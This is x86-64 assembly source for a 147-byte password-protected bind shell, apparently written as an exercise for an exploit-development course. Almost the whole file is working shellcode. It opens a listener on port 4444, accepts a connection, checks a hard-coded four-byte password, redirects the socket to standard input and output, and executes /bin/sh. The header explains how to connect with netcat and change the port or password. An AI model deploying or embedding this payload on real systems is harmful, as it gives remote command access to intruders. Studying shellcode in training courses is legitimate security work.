; ===================================================================
; Password Protected Bind Shell
; Author: SLAE64-1351 (Keyman)
; Date: 03/09/2014
;
; Shellcode length:  147 bytes
;
; Description:
;
;    Simple bind shell (listens on port 4444 by default) with 4 bytes
;    password protection. Using a 4 bytes long password is still
;    reasonably strong for a single-shot connection and keeps the
;    code shorter.
;
;    To change the port or the password just modify the values of the
;    exp_port and exp_pass "variables" below.
;
;    After the code gets executed connect to the newly opened port:
;
;    nc <IP address> <port number>
;
;    There is no password prompt. Type in the 4 bytes long password
;    and hit enter. If the password matches, you are ready to type
;    OS commands.
;
; ===================================================================

global _start
section .text

; -------------------------------------------------------------------
; Preprocessor directives so you can easily change the port and the
; password.
; -------------------------------------------------------------------

; Port number to listen on.
%define exp_port        0x5c11          ; 4444

; Password to use.
%define exp_pass        0x6c6c6568      ; hell

; -------------------------------------------------------------------
; DO NOT TOUCH
; preprocessor directives so syscalls can be easily referenced
; -------------------------------------------------------------------

%define sys_bind    49
%define sys_listen  50
%define sys_accept  43
%define sys_execve  59
%define sys_dup2    33

_start:

    ; ---------------------------------------------------------------
    ; START: create socket
    ; ---------------------------------------------------------------
      xor rax, rax
      push rax              ; saving for sockaddr
      push rax                          ; struct
      push rax              ; clear rax later
      push rax              ; set rdx to 0
      pop rdx               ; protocol
      mov al, 2
      push rax
      push rax
      pop rsi
      pop rdi               ; PF_INET
      shr rsi, 1            ; SOCK_STREAM
      add al, 39            ; socket syscall (41)
      syscall

    ; ---------------------------------------------------------------

      push rax              ; store sockfd as first
      pop rdi               ; argument of bind

    ; ---------------------------------------------------------------
    ; START: create struct
    ;
    ; srv_addr.sin_family = AF_INET;
    ; srv_addr.sin_addr.s_addr = INADDR_ANY;
    ; srv_addr.sin_port = htons(portno);
    ;
    ; This is how it looks like on the stack (port is 4444):
    ;
    ; 0x02   0x00   0x11   0x5c   0x00   0x00   0x00   0x00
    ; 0x00   0x00   0x00   0x00   0x00   0x00   0x00   0x00
    ; ---------------------------------------------------------------
      pop rax               ; clear rax so can be
                                        ; used for syscall Nr.
      mov byte [rsp], 2         ; set values
      mov word [rsp+2], exp_port
      push rsp
      pop rsi               ; addr of struct in rsi

    ; ---------------------------------------------------------------
    ; bind socket
    ; ---------------------------------------------------------------

      push rax
      pop rdx
      add dl, 16            ; socklen_t addrlen
      add al, sys_bind          ; syscall number
      syscall

    ; ---------------------------------------------------------------
    ; listen
    ; ---------------------------------------------------------------

    ; rdi should still hold the socket descriptor so we don't
    ; have to set it again

      ; We can save a 'xor rax, rax' here.
      ; If success, 0 is returned by bind, we will have the rax reg.
      ; cleared.

      push 2
      pop rsi
      add al, sys_listen
      syscall

    ; ---------------------------------------------------------------
    ; accept
    ; ---------------------------------------------------------------

    ; rdi should still hold the socket descriptor so we don't
    ; have to set it again

      ; We can save a 'xor rax, rax' here.
      ; If success, 0 is returned by listen, we will have the rax reg.
      ; cleared.

      push rax
      pop rdx
      push rax
      pop rsi
      add al, sys_accept
      syscall

    ; at this point rax contains the new socket descriptor

      push rax              ; save new sockfd
      push rax              ;
      pop rdi               ; first argument for
                    ; read()
      pop r15               ; save for later

    ; ---------------------------------------------------------------
    ; get passwd
    ;
    ; We will work with a 4 byte password, should be more than
    ; enough as no brute forcing is possible. Chances to guess
    ; the right value is 0.  Of course passwd should not contain
    ; null bytes.
    ;
    ; n = read(newsockfd,buffer,4);
    ; ---------------------------------------------------------------

      xor rax, rax          ; read() is syscall Nr. 0
      push rax              ; buffer filled with 0s
      push rsp              ; setup pointer to buf
      pop rsi
      add rdx, 4
      syscall

      ; compare pass received with valid pass and exit if no match

      xor rcx, rcx
      inc rcx
      push rsp
      pop rdi
      push exp_pass
      push rsp
      pop rsi
      cmpsq
      jne passfail          ; passwd match, give shell

shell:
    ; ---------------------------------------------------------------
    ; 6. exec shell
    ; ---------------------------------------------------------------

      add cl, 2
      mov rdi, r15
dup_loop:
      push rcx              ; have to save rcx as dup2
                    ; changes it's value
      xor rax, rax
      sub rcx, 1
      push rcx
      pop rsi
      add al, sys_dup2
      syscall
      pop rcx               ; restore the counter
      loop dup_loop

      jmp mytext

code:
    pop rdi
    mov [rdi+7], BYTE al
    push rax
    push rax
    pop rsi
    pop rdx
    add al, sys_execve
    syscall

mytext:
    call code
    MyText: db '/bin/sh', 0x41

passfail: